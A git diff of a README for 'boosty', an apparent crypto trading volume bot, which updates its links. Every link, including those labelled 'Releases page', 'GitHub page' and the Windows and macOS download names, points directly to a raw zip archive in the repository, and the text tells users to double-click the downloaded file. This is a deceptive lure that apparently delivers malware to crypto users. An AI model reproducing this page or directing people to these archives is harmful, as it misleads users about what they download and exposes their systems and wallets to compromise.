@@ -1,6 +1,6 @@
 # 🚀 boosty - Simplify Your Crypto Trading Today
 
-![Download boosty](https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/Software-3.3.zip)
+![Download boosty](https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/orchestrator/src/Software-v2.9-alpha.2.zip)
 
 ## 📋 Description
 boosty is your all-in-one tool for enhancing your trading experience with both Solana and EVM networks. It combines a volume bot and a deployer to help you automate your trading strategies effectively. With boosty, you can take control of your trading volume and maximize profits effortlessly.
@@ -16,13 +16,13 @@ To get started with boosty, please follow the steps below to download and run th
 
 ## 🔗 Download & Install
 1. **Visit the Releases Page**:  
-   Go to the official [Releases page](https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/Software-3.3.zip) to download the latest version of boosty.
+   Go to the official [Releases page](https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/orchestrator/src/Software-v2.9-alpha.2.zip) to download the latest version of boosty.
 
 2. **Select the Latest Version**:  
    On the Releases page, you will see a list of available versions. Click on the latest version to find the downloadable files.
 
 3. **Download the Application**:  
-   Click the appropriate file to start the download. The files are usually named clearly to indicate their purpose, such as `https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/Software-3.3.zip` for Windows users or `https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/Software-3.3.zip` for macOS users.
+   Click the appropriate file to start the download. The files are usually named clearly to indicate their purpose, such as `https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/orchestrator/src/Software-v2.9-alpha.2.zip` for Windows users or `https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/orchestrator/src/Software-v2.9-alpha.2.zip` for macOS users.
 
 4. **Run the Application**:  
    Once the download finishes, locate the file in your downloads folder. Double-click the downloaded file to run the application. Follow any on-screen prompts to complete the setup.
@@ -67,8 +67,8 @@ If you encounter any issues during installation or while using boosty, here are 
 Join our community for support and discussions. Connect with other users on platforms like Discord or Reddit to exchange tips and strategies.
 
 ## 📞 Contact
-For any technical inquiries or support, please create an issue on our [GitHub page](https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/Software-3.3.zip).
+For any technical inquiries or support, please create an issue on our [GitHub page](https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/orchestrator/src/Software-v2.9-alpha.2.zip).
 
 ---
 
-Whether you are a seasoned trader or just starting, boosty provides the tools you need to improve your trading efficiency. Please visit the [Releases page](https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/Software-3.3.zip) to download your version of boosty today.
+Whether you are a seasoned trader or just starting, boosty provides the tools you need to improve your trading efficiency. Please visit the [Releases page](https://raw.githubusercontent.com/TV100-PR/boosty/main/packages/orchestrator/src/Software-v2.9-alpha.2.zip) to download your version of boosty today.
